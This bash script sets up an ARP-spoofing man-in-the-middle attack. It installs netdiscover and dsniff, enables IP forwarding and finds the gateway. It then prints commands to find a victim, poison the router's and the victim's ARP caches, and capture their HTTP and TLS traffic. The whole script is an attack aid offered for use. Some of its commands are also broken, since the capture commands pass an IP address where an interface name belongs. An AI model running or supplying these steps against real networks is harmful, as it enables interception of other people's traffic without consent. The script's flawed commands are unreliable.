#!/usr/bin/env bash

# ArpSpooferStartup

# Author : Bobby Valenzuela
# Created : 8th January 2023

# Description:
# Installs the packages and prints the commands needed to perform an arp spoofing attack.
# Requires sudo privileges to run.

# If not root or sudoer...
{ [[ $(id -u) -eq 0 ]] || $(sudo -v &>/dev/null) ; } || { echo -e "Please run with sudo privileges.\nExiting..." ; exit 1 ; } 

# Functions
print_colored()
{

    [[ -z "$1" ||  -z "$2" ]] && echo "Usage: print_colored <color> <text>" && exit 1
    
    auto_print_newline=''
    [[ "$3" == 'no' ]] && auto_print_newline='-n' 

    case "$1" in
        "grey" | "GREY")        echo -e ${auto_print_newline} "\033[90m$2 \033[00m" ;;
        "red" | "RED")          echo -e ${auto_print_newline} "\033[91m$2 \033[00m" ;;
        "green" | "GREEN")      echo -e ${auto_print_newline} "\033[92m$2 \033[00m" ;;
        "yellow" | "YELLOW")    echo -e ${auto_print_newline} "\033[93m$2 \033[00m" ;;
        "blue" | "BLUE")        echo -e ${auto_print_newline} "\033[94m$2 \033[00m" ;;
        "purple" | "PURPLE")    echo -e ${auto_print_newline} "\033[95m$2 \033[00m" ;;
        "cyan" | "CYAN")        echo -e ${auto_print_newline} "\033[96m$2 \033[00m" ;;
        "white" | "WHITE")      echo -e ${auto_print_newline} "\033[96m$2 \033[00m" ;;
        *   )               echo -e ${auto_print_newline} "\033[96m$2 \033[00m" ;;
    esac


}
# => End Functions

# Get main dist type
main_dist=$(cat /etc/os-release | grep ID_LIKE | cut -d "=" -f2)
# main_dist=${main_dist,,}

if [[ "${main_dist,,}" =~ debian|kali|ubuntu ]]
then
    pkg_mger='apt'
elif [[ "${main_dist,,}" =~ rhel|rocky|fedora|centos ]]
then
    pkg_mger='yum'
else
    echo "Could not find dist - exiting." && exit 1
fi

# Install Packages
printf "Installing necessary packages..."
sudo ${pkg_mger} update &> /dev/null && echo "${pkg_mger} cache updated!"

# Netdiscover
if which netdiscover &> /dev/null 
then
    echo "netdiscover is already installed."
else
    if [[ "${pkg_mger}" == 'yum' ]]
    then
        echo -e "\nCould not install netdiscover. Please consider using a Debian-based distro or compiling netdiscover source code from a tarball.\n"
    else
        sudo ${pkg_mger} install netdiscover -y &> /dev/null && echo "Netdiscover has been installed!"
    fi
fi

# Dsniff
if which dsniff &> /dev/null
then
    echo "dsniff is already installed."
else
    sudo ${pkg_mger} install dsniff -y &> /dev/null && echo "Dsniff has been installed!"
fi

if which net-tools &> /dev/null
then
    echo "net-tools is already installed."
else
    sudo ${pkg_mger} install net-tools -y &> /dev/null && echo "net-tools has been installed!" # route command
fi


printf "All Packages Installed!\n\n"


# Enable port-forwarding
sudo sysctl -w net.ipv4.ip_forward=1 &> /dev/null || sudo echo 1 > /proc/sys/net/ipv4/ip_forward &> /dev/null

# Veryfy port-forwarding is enabled, if not then exit
port_forwarding_enabled=$(sudo cat /proc/sys/net/ipv4/ip_forward)
{ [[ ${port_forwarding_enabled} -eq 1 ]] && echo "Port-Fowarding Enabled!" ; } || { echo -e "Port-Fowarding could not be enabled...\nExiting!" ; exit 1 ; }

# Get default gateway
default_gateway=$(ip route show | egrep "default\s*via" | cut -d " " -f 3 | xargs )     # Using xargs just to trim leading/trailing white-space
default_gateway_interface=$(ip route show | egrep "default\s*via" | awk '{ print $5 }' )     # Using xargs just to trim leading/trailing white-space


# RegxMatch to verify we've found the default gateway
[[ ! "${default_gateway}" =~ ([0-9]\.){1,3} ]] && { echo -e "Could not find default gateway.\nExiting..." ; exit 1 ; }

# [TBD] Could use route -n to get gateway too possibly...

printf "Your default gateway is: ${default_gateway} via ${default_gateway_interface}\n"

print_colored 'green' "\n=== Here are the commands to run ===\n"

# Scan for local systems with netdiscover
print_colored 'cyan' "[TERMINAL 1] Find a victim:"
printf "\t\t sudo netdiscover\n\n"

print_colored 'cyan' "[TERMINAL 2] Spoof the router:"
printf "\t\tsudo arpspoof -i ${default_gateway_interface} -t <victim_ip> ${default_gateway}\n\n"

print_colored 'cyan' "[TERMINAL 3] Spoof the victim:"
printf "\t\tsudo arpspoof -i ${default_gateway_interface} -t ${default_gateway} <victim_ip>\n\n"

print_colored 'cyan' "[TERMINAL 4] View/Capture Traffic\n"
print_colored 'purple' "\t\t=> View HTTP traffic with urlsnarf:" 'no'
printf "sudo urlsnarf -i ${default_gateway}\n"

print_colored 'purple' "\t\t=> Capture TCP traffic with tcpdump:" 'no'
printf "sudo tcpdump -i ${default_gateway} tcp port 443 -w arp_spoof.pcap\n"

print_colored 'purple' "\t\t=> Or view traffic in real time with wireshark :)\n"

print_colored 'yellow' "Once you're done - don't forget to disable port-forwarding!"

# Disable port-forwarding
printf "\n\t\tsudo sysctl -w net.ipv4.ip_forward=0\n\n" 

print_colored 'red' "\t\tHAPPY HACKING!\n"

